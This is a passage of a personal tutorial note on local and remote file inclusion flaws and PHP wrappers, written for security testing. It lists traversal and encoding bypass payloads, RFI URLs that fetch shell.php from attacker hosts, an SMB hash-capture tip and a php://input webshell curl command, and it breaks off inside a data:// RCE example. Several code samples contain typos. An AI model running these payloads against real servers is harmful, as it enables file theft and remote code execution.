---
created: 2025-11-10 01:52:03
---
## File inclusion

Applications often need to load various resources based on user actions, such as configuration files or page templates. This is commonly implemented through dynamic file inclusion — when the application loads and processes different files based on user-controlled parameters.

However, when user input is concatenated straight into parameters of file inclusion functions without adequate validation, this leads to **file inclusion vulnerabilities**. 

>**File inclusion** vulnerabilities occur when an application dynamically includes files based user-controlled input without proper validation. 

The severity of file inclusion vulnerabilities ranges from sensitive information disclosure to **complete system compromise**, depending on the vulnerability type, application configuration, and attacker capabilities. 

File inclusion vulnerabilities can be divided into two types, depending on the source of the included files:

- **Local File Inclusion (LFI)** allow an attacker to include files stored locally on the target server. 
	- This would typically give an attacker read access to sensitive system files, sometimes to source code, configuration, and logs. 
	- In some cases, LFI can be exploited to RCE (Remote Code Execution).

- **Remote File Inclusion (RFI)** allows an attacker to include files stored on arbitrary remote servers, including those under attacker control.
	- RFI is significantly more dangerous than LFI, through much less common. 
	- It almost always leads to immediate RCE on the target server.
	- RFI typically implies LFI.

>[!note] LFI is more common than RFI because it usually doesn't require any specific server configuration to be exploitable.


>[!note] File inclusion vulnerabilities remain prevalent in PHP application, though they're not limited to them.


## Background: the web root and filesystems

### The web root

>A **web root**, also called **web document root**, is a top-level directory on a web server that contains publicly accessible files served by the application.

- The location of the web root directory depends on the web server in use an its configuration. 
- Common locations include:

| Server | OS      | Web root                                 |
| ------ | ------- | ---------------------------------------- |
| Apache | Linux   | `/var/www/html`, `/var/www`              |
| Nginx  | Linux   | `/usr/share/nginx/html`, `/var/www/html` |
| IIS    | Windows | `C:\inetpub\wwwroot`                     |
| XAMPP  | Linux   | `/opt/lampp/htdocs`                      |
| XAMPP  | Windows | `C:/xampp/htdocs`                        |
| WAMP   | Windows | `C:\wamp\www`, `C:\wamp64\www`           |
| Apache | macOS   | `/Library/WebServer/Documents`           |

- The web root usually contains only **publicly accessible files** — HTML, CSS, JavaScript, and media files like images or video. 
- Backend application code and configuration files are usually stored outside the web root in directories like `/srv`, `/srv/app`, `/opt/application`, etc.

>[!important] Website visitors should never be able to access files outside of the web root. 


>[!note]+ Wordlists with default web root directories
> 
> - Linux ([`seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)):
> 
> ```
> var/www/html/
> var/www/
> var/www/sites/
> var/www/public/
> var/www/public_html/
> var/www/html/default/
> srv/www/
> srv/www/html/
> srv/www/sites/
> home/www/
> home/httpd/
> home/$USER/public_html/
> home/$USER/www/
> ```
> 
> - Windows ([`seclists/Discovery/Web-Content/default-web-root-directory-windows.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)):
> 
> ```
> c:\inetpub\wwwroot\
> c:\xampp\htdocs\
> c:\wamp\www
> ```
### Web server process users and permissions

- Files and directories accessible via file inclusion vulnerabilities depends on the privileges of the user on behalf of which the web server is running (the web server process).

Commonly, web servers run under:

| System         | Default user                        | Group                |
| -------------- | ----------------------------------- | -------------------- |
| Apache (Linux) | `www-data`, `apache`, or `httpd`    | `www-data`, `apache` |
| Nginx (Linux)  | `nginx` or `www-data`               | `nginx`, `www-data`  |
| IIS (Windows)  | `IUSR` or `IIS APPPOOL\AppPoolName` | `IIS_IUSRS`          |

These are usually service accounts that have read access to web root content and minimal permissions elsewhere on the filesystem. However, misconfigurations can significantly expand the set of accessible files.
### Directory separators

File path syntax varies across operating systems:

| OS                  | Root directory              | Directory separator                   | Case-sensitive? | Example                       |
| ------------------- | --------------------------- | ------------------------------------- | --------------- | ----------------------------- |
| Unix/Linux<br>macOS | `/`                         | `/`                                   | Yes             | `/var/www/html/file.txt`      |
| Windowos            | `C:\`<br>(`drive_letter:\`) | `\` (primary) or `/` (often accepted) | No              | `C:\inetpub\wwwroot\file.txt` |
| Classic Mac OS      | `drive:`                    | `:` (primary) or `/`                  | Varies          | `Macintosh HD:folder:file`    |

>[!important] Modern Windows APIs accepts both forward slashes (`/`) and backslashes (`\`) as directory separators.
>- That's why payloads designed for Unix systems often work on Windows.

- **Current directory:** `.` — References the current working directory.
- **Parent directory:** `..` — References the directory one level up in the hierarchy.
- **Home directory: `~`** — On Unix/Linux, expands to the current user's home directory.
### Absolute vs. relative paths

Depending on the web server and configuration, applications reference files using either:

- **Absolute paths:** Start from the filesystem root directory and specify the complete path to the resource (e.g., `/etc/passwd`).
- **Relative paths:** Specify paths relative to the current working directory (e.g., `./includes/config.php`, `../../etc/passwd`).

During black-box testing, you would usually try all variants to find what works.
### UNC paths

>**UNC (Universal Naming Convention)** paths on Windows systems provide a standardized way to access network resources.

UNC paths follow the format:

```
\\\<server>\<share_name>\<path>\<file>
```

> [!example]+
> ```
> \\\attacker.com\share\shell.php
> ```

This feature can sometimes be exploited to escalate **LFI to RFI** or force the server to initiate SMB connections to attacker-controlled servers (which, among other things, can be exploited in Pass-the-Hash attacks).
### Path normalization

Before accessing files,, most file systems and APIs **normalize** paths:

- `.` (**current directory**) is removed:

```
/var/www/./html/./file.txt  ⇢  /var/www/html/file.txt
```

- `..` is resolved to the **parent directory**:

```
/var/www/html/../config.php  ⇢  /var/www/config.php
```

- **Redundant separators** are collapsed:

```
/var///www//html////file.txt  ⇢  /var/www/html/file.txt
C:\\\\inetpub\\\\wwwroot  ⇢  C:\inetpub\wwwroot
```

- Many systems remove or ignore **trailing slashes**:

```
/var/www/html/  ⇢  /var/www/html 
```

Path normalization can occur at **multiple layers** — web servers (Apache, Nginx, IIS), reverse proxies, WAFs (Web Application Firewalls), application code, and filesystems. Discrepancies between those layers create opportunities for validation bypass.

>[!note] See [[#Payloads and validation bypass]].
## Local File Inclusion

>**Local File Inclusion (LFI)** is a vulnerability that occurs when an attacker can force the application to include files stored locally on the web server.

>[!important]+ Impact
> LFI can lead to:
>
> - **Sensitive information disclosure** (reading system files, configuration, application source code, or any other information exposed in files accessible by the web server user).
> - **Remote code execution** (such as through PHP wrappers, log poisoning, session file manipulation, or file upload combined with inclusion).
> - **Privilege escalation** (using information gathered about the system for planning further attacks).

>[!example]+
>Suppose the user can change the language of the page, say, by clicking a button. This sets the `language` URL query parameter:
>```
>https://example.com/index.php?language=es.php
>```
>This parameter carries the name of the file with the text in the corresponding language the application should use. 
>- On the back-end, it looks:
>```PHP
>if (issset($_GET['language'])) {
>	include($_GET['language']);
>}
>```
>- The code retrieves a filename from the `language` URL query parameter and directly uses it as an argument to the `include()` function that includes the file content in the response. 
>```PHP
>include('es.php');
>```
>
>- The problem is that the application **trusts user input implicitly** and **doesn't validate the parameter value**. 
>
>In this case, the attacker can inject any file path and, if the user on the server the application is running as has enough permissions to read it, this file will be displayed on the page. For example:
>```
>https://example.com/?page=/etc/passwd
>```
>This will cause the application to display the `/etc/passwd` file in response's HTML.
>This is a local file inclusion vulnerability.

### LFI in source code


Many programming languages implement file inclusion functions that, given no proper validation, can be exploited for LFI (and sometimes RFI):

- **PHP**

```PHP
// all of these are vulnerable if the user controls the filename
include($file);              // includes and evaluates file; warning on failure
include_once($file);         // includes file only once
require($file);              // includes and evaluates file; fatal error on failure  
require_once($file);         // requires file only once
file_get_contents($file);    // reads entire file into string (no execution)
fopen($file, 'r');           // opens file for reading
readfile($file);             // outputs file contents
file($file);                 // reads entire file into array
highlight_file($file);       // syntax highlighting of PHP file
show_source($file);          // alias for highlight_file
```

>[!note]+
>Read more about these functions in the documentation:
>- [`include()`](https://www.php.net/manual/en/function.include.php)
> - [`include_once()`](https://www.php.net/manual/en/function.include-once.php)
> - [`require()`](https://www.php.net/manual/en/function.require.php)
> - [`require_once()`](https://www.php.net/manual/en/function.require-once.php)
> - [`file_get_contents()`](https://www.php.net/manual/en/function.file-get-contents.php)

- **Python**

```Python
# Flask/Django vulnerable patterns
open(filename, 'r')                    # opens file for reading
with open(filename) as f:              # context manager for file reading
exec(open(filename).read())            # executes file content as code
eval(compile(open(filename).read()))   # compiles and evaluates file
__import__(filename)                   # dynamic module import
```

>[!example]+ Example: Vulnerable file reader in Python
> 
> ```Python
> from flask import Flask, request, render_template
>  
> app = Flast(__name__)
> 
> @app.route('/', methods=['GET'])
> def index():
> 	filename = request.args.get('file') # reads filename from the query parameter, no validation
> 	with open(filename, 'r') as f:
> 		content = f.read() # opens the file for reading and stores its content in a variable
> 	return render_template('index.html', file=content) # renders a template with file content
> ```
> 
> Exploitation:
> 
> ```
> https://example.com/?file=../../../../../../../../../etc/passwd
> ```
> 
> ![[directory_traversal.png]]


>[!example]+ Example: Vulnerable template loading in Python (Flask)
> 
> ```Python
> from flask import Flask, request, render_template
>  
> app = Flast(__name__)
> 
> @app.route('/', methods=['GET'])
> def index():
> 	template = requests.args.get('template', 'default') # reads filename, no validation
> 	return render_template(f'{template}.html') # loads a template based on user-controlled parameter
> ```
> 
> Exploitation:
> 
> ```
> https://example.com/?template=../../../../etc/passwd
> ```

- **Java**

```Java
// vulnerable patterns
FileInputStream(filename)                 // reads file as stream
BufferedReader(new FileReader(filename))  // buffered file reading
Files.readAllBytes(Paths.get(filename))   // reads entire file
new File(filename)                        // file object creation
include(filename) // JSP                  // JSP include directive
```

>[!example]+ Example: Flawed document viewer in Java
> 
> ```Java
> public void viewDocument(String filename) {
>     File file = new File("/documents/" + filename); // normally access files in the ./documents directory
>     FileInputStream fis = new FileInputStream(file);
>     // ... read and display file
> }
> ```
> 
> Exploitation:
> 
> ```
> https://example.com/view?filename=../../../../etc/passwd
> ```

- **Node.js**

```JS
// vulnerable patterns
require(filename)                      // module loading (executes code)
fs.readFile(filename)                  // asynchronous file reading
fs.readFileSync(filename)              // synchronous file reading
fs.createReadStream(filename)          // stream-based reading
```

>[!example]+ Example: Node.js vulnerable file download
> 
> ```JS
> app.get('/download', (req, res) => {
>     // vulnerable file download
>     const filename = req.query.file;
>     res.sendFile(__dirname + '/files/' + filename);
> });
> ```
> 
> Exploitation:
> 
> ```
> https://target.com/download?file=../../../../etc/passwd
> ```

### Common injection points

The injection may occur in almost any part of the application that processes user input:

- `GET` parameters (query strings; arguably the most common injection point).
- `POST` parameters 
- HTTP headers (e.g., `X-Forwarded-For`, `Referer`, `User-Agent`, etc.)
- Cookies
- Hidden form fields
- Session variables
- Upload filenames
- Redirect URLs
- API endpoints
- CMS themes/templates
- Path segments (URL path parameters in RESTful APIs)
- etc.

Common `GET` parameters vulnerable to LFI (from [here](https://x.com/trbughunters/status/1279768631845494787); run the command and copy output):

```bash
echo "cat dir action board date detail file download path folder prefix include page inc locate show doc site type view content document layout mod conf" | tr ' ' '\n'
```

>[!note]+
>Command I used to transform the [original text](https://x.com/trbughunters/status/1279768631845494787) to get the above space-separated list of parameter names:
>```
>cat param.txt | awk -F '=' '{print $1}' | sed 's/^.//' | tr '\n' ' '
>```

>[!tip]+
>Use tools like Burp Suite's **Param Miner** or **Arjun** to enumerate potentially vulnerable parameters. 
>```bash
>arjun -u https://example.com/index.php
>```
>You can also use **`ffuf`** to fuzz parameter names.
>```bash
> ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
>      -u 'https://example.com/index.php?FUZZ=key' \
>      -fs 4242  # filter responses based on size 
>```

>[!tip]
>- You can also fuzz for potentially vulnerable parameters:
> ```bash
> ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
> ```
> 
> ```bash
> ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
> ```
> 
> ```bash
>  ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
> ```
> 

>[!note]+ Useful fuzzing wordlists for LFI
> - [`seclists/Fuzzing/LFI/LFI-Jhaddix.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
> - [`seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt)
> - [`seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt)
> - [`seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Windows-adeadfed.txt)
> - [`seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt)
> - [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
> - [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt)
> - [`seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-linux-and-windows_by-1N3%40CrowdShield.txt")
> - [`seclists/Fuzzing/LFI/OMI-Agent-Linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/OMI-Agent-Linux.txt)
> 

Any part of the application may be vulnerable. Commonly exploited functionality includes:
- File download
- Document viewing
- Template loading
- Settings and preferences (e.g., language selection)
- File generation/processing
- File export
- Images/media handling

>[!note]+ When LFI is harder to spot
> - When the application appends a fixed extension (e.g., `.php`, `.jpg`, etc.).
> - When the application enforces a base folder (e.g., must start with `./uploads`).
> - When there's filtering in place.
> - When the parameter is stored in a database first (second-order LFI).

### Validation bypass
#### Handling appended extensions

Often, developers would append a fixed file to limit accessed files to a specific type:

```PHP
<?php
include($_GET['language'] . '.php')
?>
```

This attempts to force all includes to PHP files.

>[!example]+
> In the above example, the code appends `.php` to the value of the `language` parameter so that `es` becomes `es.php`. This means that if you inject `/etc/passwd`, the application actually tries to access `/etc/passwd.php`. Since it doesn't exist, you get an error.

Here are several bypass techniques you may try:

- **Null byte injection** (PHP < 5.5)
	- PHP versions before 5.5 were vulnerable to **null byte injection** bypass: a URL-encoded null byte (`%00`) would cause PHP to prematurely terminate string processing.

>[!example]+
>PHP < 5.5 treats `/etc/passwd%00.php` as `/etc/passwd`, ignoring everything after the null byte.
>```
>/etc/passwd
>```
>- `\x00` or `\0` might work as well.


>[!interesting]+ The null byte
>A **null byte, `%00` or `0x00`**, also known as a  **null character**, is a special control character used as a string terminator in many programming languages, including C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.

>[!warning] Null byte injection no longer works on modern systems — this was patched in PHP 5.5+.

- **Path truncation** (PHP < 5.5)
	- On 32-bit systems, PHP had a maximum path length of 4096 characters. Paths longer than this were truncated.

>[!example]+
>With PHP < 5.5, if you inject a path long enough, you would cause the application to truncate the appended extension. For this, you can use long directory traversal sequences that eventually resolve to what you need:
>```
>?file=../../../../etc/passwd/././././././[repeat many times]./././
>```

>[!warning] Patched in PHP 5.5+ — path truncation won't work on modern versions.

>[!note] Even if you can't get rid of the extension, you may still exploit LFI to read files with that extension. For example, if it's `.php` what's appended, you may be able to read PHP source code files.

>[!tip]+
> - You can try fuzzing characters that might be interpreted as delimiters on the back-end (just like you would do in web cache deception testing):
> 
> ```bash
> echo "'" && echo '! " # $ % &  ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~ %21 %22 %23 %24 %25 %26 %27 %28 %29 %2A %2B %2C %2D %2E %2F %3A %3B %3C %3D %3E %3F %40 %5B %5C %5D %5E %5F %60 %7B %7C %7D %7E' | tr ' ' '\n'
> ```
### Path prefix validation

Applications may require user-supplied filenames to start with a specific base folder (e.g., `/var/www/html`):

```PHP
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
	include($_GET['language']); 
} else { 
	echo 'Illegal path specified.'; 
}
```

This can be bypassed by first including the required base folder in the file path, and then navigating away from it with traversal sequences:

```PowerShell
.languages/../../../../../../etc/passwd
/var/www/images/../../../../etc/passwd
```
### Nested traversal sequences

Many filters remove or block traversal sequences like `../` or `..\`. But if the filter is not recursive, nested sequences bypass the protection:

- `....//....//....//` -> After removing one `../`, still leaves `../`.
- `..../\..../\..../\` -> Mixes slashes `/` and backslashes `\` for cross-platform bypass.

The filter removes one instance of `../`, but nested characters reconstitute valid traversal sequences.

```
....//....//....//etc/passwd
```

```
....//....//....//
..././..././..././
..../\..../\..../\
.../.\.../.\.../.\
....\/....\/....\/
...\./...\./...\./
```

![[nested_directory_traversal_bypass.png]]
### Encoding

Characters used in directory traversal sequences might be blocked. A common way to bypass this is by using different encoding schemes:

- **URL encoding:** `/` ⇢ `%2f`, `\` ⇢ `%5c`, `.` ⇢ `%2e`
- **Double URL encoding:** `/` ⇢ `%252f`, so `%252e%252e%252f` decodes to `../`
- **Unicode encoding:** `/` ⇢ `%u002f`, `\` ⇢ `%u005c`
- **UTF-8 overlong encoding:** `/` ⇢ `%c0%af`, `.` ⇢ `%c0%2e`
- **Mixing encodings:** you can combine different encodings in the same payload to bypass filters.

>[!tip]+
>Try to combine different encoding schemes to bypass filters.
#### URL encoding

>[!example]+ URL encoding — [CyberShef example](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)&input=Li4vLi4v)
> 

```bash
%2E%2E%2F%2E%2E%2F%2E%2E%2F # ../../../
%2E%2E%2Fetc%2Fpasswd       # ../etc/passwd
%2E%2E/                     # partial encoding ../
..%2F                       # partial encoding ../
```

| Character | URL encoding |
| --------- | ------------ |
| `/`       | `%2f`        |
| `\`       | `%5c`        |
| `.`       | `%2e`        |
#### Double URL encoding

>[!example]+ Double URL-encoding — [CyberShef example](https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)URL_Encode(true)&input=Li4vLi4vLi4v)
> 
> ```PowerShell
> %252E%252E%252F%252E%252E%252F%252E%252E%252F # ../../../
> ```

| Character | Double URL encoding |
| --------- | ------------------- |
| `/`       | `%252f`             |
| `\`       | `%255c`             |
| `.`       | `%252e`             |

#### Unicode encoding

>[!example]+ Unicode encoding — [CyberShef example](https://gchq.github.io/CyberChef/#recipe=Escape_Unicode_Characters('%5C%5Cu',true,4,false)&input=Li4vLi4vLi4v)
> 
> - Can be used with different prefixes: `\u`, `%u`, `+U`.
> 
> ```PowerShell
> %u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f # %u - ../../../
> \u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f # \u - ../../../
> U+002eU+002eU+002fU+002eU+002eU+002fU+002eU+002eU+002f # +U - ../../../
> ```

| Character | Unicode `%u` | Unicode `\u` | Unicode `+U` |
| --------- | ------------ | ------------ | ------------ |
| `/`       | `%u002f`     | `\u002f`     | `U+002f`     |
| `\`       | `%u005c`     | `\u005c`     | `U+005c`     |
| `.`       | `%u002e`     | `\u002e`     | `U+002e`     |

#### UTF-8 overlong encoding 

>[!example]+ UTF-8 overlong encoding
> 
> ```
> . = %c0%2e, %e0%40%ae, %c0ae
> / = %c0%af, %e0%80%af, %c0%2f
> \ = %c0%5c, %c0%80%5c
> ```

| Character | Encoding    |
| --------- | ----------- |
| `/`       | `%c0%af`    |
|           | `%e0%80%af` |
|           | `%c0%2f`    |
| `\`       | `%c0%5c`    |
|           | `%c0%80%5c` |
| `.`       | `%c0%2e`    |
|           | `%e0%40%ae` |
|           | `%c0ae`     |

A mini-cheatsheet:

```bash
# URl encoding

%2e%2e%2f # ../
%2e%2e/   # ../
..%2f     # ../
%2e%2e%2c # ..\
%2e%2e/   # ..\
..%2c     # ..\

# double URl encoding

%252e%252e%252f # ../
%252e%252e%2f   # ../
%2e%2e%252f     # ../
%252e%252e%252c # ..\
%252e%252e%2c   # ..\
%2e%2e%252c     # ..\

# 16-bit unicode 
%u002e%u002e%u002f # ../ 
%u002e%u002e/      # ../
..%u002f           # ../
%u002e%u002e%u005c # ..\
%u002e%u002e\      # ..\
..%u005c           # ..\

# UTF-8 encoding
%c0%2e%c0%2e%c0%af # ../
%c0%2e%c0%2e%c0%5c # ..\
```
### Length restrictions

The application might limit the length of the payload you can submit. In this case, you can try injecting a long traversal sequence first and then remove characters gradually until the application accepts the payload:

```bash
../../../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../etc/passwd
../../../../etc/passwd
../../../etc/passwd
```
### On `Content-Disposition`

The browser usually displays content of the files fetched from the server right on the web page, but it might not always be the case. This behavior is controlled by the `Content-Disposition` header:

- **`Content-Disposition: inline`**  
	- The file content is rendered directly on the page; convenient for testing.

- **`Content-Disposition: attachment`**
	- The browser prompts you to download and open the file separately, which is quite inconvenient during the tests (especially when you test lots of payloads).

A workaround is to use tools like `curl` or `wget`. They ignore the `Content-Disposition` header and output file content directly to the terminal (by default):

```
curl -s "https://example.com/file?page=../../../../etc/passwd"
```

### Second-order LFI

>**Second-order LFI** occurs when user input is first safely stored (in a database, file, session) and later used in a file operation without proper validation.

>[!example]+ Example: Second-order LFI
> The user uploads an avatar with the filename:
> 
> ```
> ../../../../etc/passwd
> ```
> 
> This filename is stored in a database. 
> 
> Later on, when the user views their profile, the application retrieves the filename of the avatar file from the database and includes it. But the application includes `/etc/passwd` instead of the avatar. 
> 
> ```PHP
> $user = getUser($user_id); 
> $avatar_path = "/var/www/uploads/" . $user['avatar']; 
> include($avatar_path); // vulnerable - uses unvalidated stored data
> ```

Second-order vulnerabilities are much harder to detect that classic file inclusion; they require you to watch carefully where input flows throughout the application. Such testing is much easier to conduct during white-box engagements, with the source code in hands.
## Remote File Inclusion

>**Remote File Inclusion (RFI)** is a vulnerability that occurs when an attacker can force the application to fetch and process files from arbitrary remote servers.

>[!critical] RFI is one of the **most critical** server-side vulnerabilities. Successful exploitation **almost always** leads to immediate **Remote Code Execution (RCE)** on the target server.

- Same as LFI, RFI vulnerabilities occur when the application dynamically includes files based on user-controlled parameters without proper validation, except that in the latter case the application also accepts URLs to remote files.
- This is why RFI typically implies LFI, and LFI can often be escalated to RFI.

>[!important]+ Through RFI is almost always also an LFI, an LFI may not necessary be an RFI. 
> There are several factors that may prevent LFI-to-RFI escalation:
>- The vulnerable function may not accept remote URLs.
>- You may only control a portion of the filename, and not the protocol scheme or wrapper (e.g., `http://`, `https://`, `ftp://`, etc.).
>- The application might be configured to disable inclusion of remote files altogether.

For example, in PHP, for RFI to be possible, two specific `php.ini` configuration directives must be enabled:

- `allow_url_fopen = On`: Allows PHP file functions to treat URLs as if they were local files; **enabled by default**.
- `allow_url_include = On`: Allows `include()`, `require()`, `include_once()`, and `require_once()` to accept remote URLs; **disabled by default** since PHP 5.2.0.

>[!note] The fact that `allow_url_include` is now disabled by default is the primary reason RFI is much rarer today.

>[!note]+
>Read more about these functions in the documentation:
>- [`include()`](https://www.php.net/manual/en/function.include.php)
> - [`include_once()`](https://www.php.net/manual/en/function.include-once.php)
> - [`require()`](https://www.php.net/manual/en/function.require.php)
> - [`require_once()`](https://www.php.net/manual/en/function.require-once.php)
> - [`file_get_contents()`](https://www.php.net/manual/en/function.file-get-contents.php)
### Testing for RFI

To test if a certain parameter is vulnerable to RFI, try to include remote files from your controlled servers using different protocols:

- **HTTP(S):**

```
https://example.com/index.php?language=http://<attacaker_ip_address>:<port>/shell.php&cmd=id
```

>[!warning] For RFI to be possible, the target web server **must be allowed to make outbound network connections** to reach your system. This is often blocked by firewalls.
>- This is why RFI is much more likely if you're on the same network with the target.

>[!tip]+
>- To start an HTTP server on your attacker machine, navigate to the directory with the files you want to serve and run:
>```bash
>sudo python3 -m http.server 8080
>```

- **FTP:**

```
https://example.com/index.php?language=ftp://<attacker_ip_address>/shell.php&cmd=id
```

>[!tip]+
>- To start an FTP server with anonymous access:
>```bash
>sudo python -m pyftpdlib -p 21 -w
>```
>- Or, with custom credentials (in URL, written as `ftp://username:passwod@<attacker_ip_address>/<path>`):
>```bash
>sudo python -m pyftpdlib -p 21 -u username -P password 
>```

- **SMB (Windows):**

```
https://example.com/index.php?language=\\<attacker_ip_address>\shell.php&cmd=id
```

>[!tip]+
> - To start an SMB serve on your attacker machine, you can use Impacket:
> 
> ```bash
> impacket-smbserver -smb2support share $(pwd)
> ```

>[!tip]+ UNC paths is one of the ways to escalate LFI to RFI.

>[!note] Linux doesn't interpret UNC paths by default like Windows does, so this will likely be effective only against Windows targets.

>[!important] With SMB-based RFI, even if code execution fails, you may **capture NTLM hashes** when the target machine attempts to authenticate to your server. Then attempt to crack it and get SMB credentials to connect.

## PHP wrappers and LFI to RCE

>**PHP wrappers**, also called **stream wrappers** or **protocol wrappers**, are a powerful abstraction layer built into PHP that allows the language to handle different types of data streams through a unified interface.

- PHP wrappers extend PHP's file handling capabilities beyond simple local filesystem operations. They allow access to various data sources, such as **remote files**, **compressed archives**, **raw input data**, **memory streams**, and more — all through standard file operation functions like `include()`, `file_get_contents()`, `fopen()`, and `readfile()`.

>[!important] PHP wrappers are a powerful exploitation vector: it can be used to escalate read-only LFI to **remote code execution**.

Wrappers are specified by a prefix before the resource locator:

```
wrapper://[parameters]/resource
```

>[!example] For example, `http://example.com/file.txt` uses the HTTP wrapper to fetch remote content, and `file://etc/passwd` uses the file wrapper for local filesystem access. 

>[!interesting]+ How PHP processes wrappers
> 1. PHP parses the protocol scheme (before `://`).   
> 2. Identifies the registered wrapper handler.
> 3. Delegates the operation to that wrapper.
> 4. The wrapper performs its specific operations.
> 5. Returns data in standardized format to PHP core.
> 6. PHP processes the returned data (executing code if appropriate).

### `php://filter`

>The **`php://filter` wrapper** creates a chains of filters that process the target resource before returning it to the application.

- `php://filter` allows you to read files, including source code, but without execution. 
- It works on **default PHP configuration with no special settings required** (i.e., doesn't require `allow_url_include=On`).

Format:

```
php://filter/[filter_name]/resource=[target_file]
```

- `[filter_name]`: One or more filters (can be chained with `|`).
- `[target_file]`: The target file to read.

>[!note]+ Supported filter types
> - [String filters](https://www.php.net/manual/en/filters.string.php)
> 	- `string.rot13`
> 	- `string.toupper`
> 	- `string.tolower`
> - [Conversion filters](https://www.php.net/manual/en/filters.convert.php)
> 	- `convert.base64-encode`
> 	- `convert.base64-decode`
> 	- `convert.iconv.*` (character set conversion)
> - [Compression filters](https://www.php.net/manual/en/filters.compression.php) 
> 	- `zlib.deflate`
> 	- `zlib.inflate`
> 	- `bzip2.compress`
> 	- `bzip2.decompress`
> - [Encryption filters](https://www.php.net/manual/en/filters.encryption.php)
> 	- `mcrypt.*`
> 	- `mdecrypt.*`

- The `convert.base64-encode` filter, used to Base64-encode data, is probably the most useful in LFI to read files:

```
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=/etc/passwd
```

>[!tip]+ 
>- Decode Base64:
>```bash
>echo "<Base64>" | base64 -d
>```

- There's also `convert.rot13` that uses [ROT13](https://en.wikipedia.org/wiki/ROT13) encoding:

```
php://filter/read=string.rot13/resource=config.php
```

>[!tip]+ 
>- Decode ROT13:
>```bash
>echo "<ROT13>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
>```

- `string.toupper` and `string.tolower` convert strings to uppercase/lowercase:

```
php://filter/string.toupper/resource=config.php
php://filter/string.tolower/resource=config.php
```

- `convert.iconv.*` filters are used for character set conversion:

```bash
php://filter/convert.iconv.utf-8.utf-7/resource=config.php  # UTF-8 to UTF-7
php://filter/convert.iconv.utf-8.utf-16/resource=config.php # UTF-8 to UTF-16
```

- Filters can be chained by using the `|` character (`filter://read=filter1|filter2|filter2.../resource=<file>`):

```
php://filter/read=string.rot13|convert.base64-encode/resource=config.php
```

### `php://input`

>The **`php://input` wrapper** provides a read-only access to the raw HTTP `POST` request body. 

- When used in file inclusion functions, `php://input` reads the `POST` data and treats it as file content. 
- The wrapper also **executes any PHP code** it finds.
- It only works with **HTTP `POST` requests** (`GET` won't work).

>[!important] `php://input` can be exploited to gain RCE.

>[!warning] `php://input` requires **`allow_url_include=On`** in `php.ini` (common in legacy systems) and a HTTP `POST` request.

>[!note]+ How `php://input` works
> 1. Attacker sends a `POST` request with PHP code in the body.
> 2. Application includes `php://input`.
> 3. PHP reads raw `POST` data stream.
> 4. Include function receives `POST` body as "file content".
> 5. PHP executes the code in `POST` body.
> 6. Attacker gains code execution.

>[!example]+ Example: RCE with `php://input`
> - URL:
> 
> ```
> http://example.com/index.php?page=php://input&cmd=id
> ```
> 
>- `POST` body:
> 
> ```PHP
> <?php system($_GET["cmd"]); ?>
> ```
>This together executes the `id` command on the server and displays the output on the page.
>- With cURL:
> ```bash
> curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.122.72:59642/index.php?language=php://input&cmd=id" | grep uid
> ```

### `data://`

>The **`data://` wrapper** implements [`RFC 2397`](https://datatracker.ietf.org/doc/html/rfc2397) data URIs, which can be used to embed data directly in the URL. 

- `data://` is similar to `input://` but **works with `GET` requests**. 

>[!important] `php://data` can be exploited to gain RCE.

Format:

```
data://[media_type][;encoding],[data]
```

>[!warning] To work, the `data://` wrapper requires `allow_url_include=On` and `allow_url_fopen=On` in `php.ini`.

>[!example]+ Example: Running `phpinfo()`
> ```
> https://example.com/index.php?page=data://text/plain,<?php phpinfo(); ?>
> ```
> - URL-encoded:
> ```
> https://example.com/index.php?page=data://text/plain,%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E
> ```

>[!example]+ Example: RCE
> ```
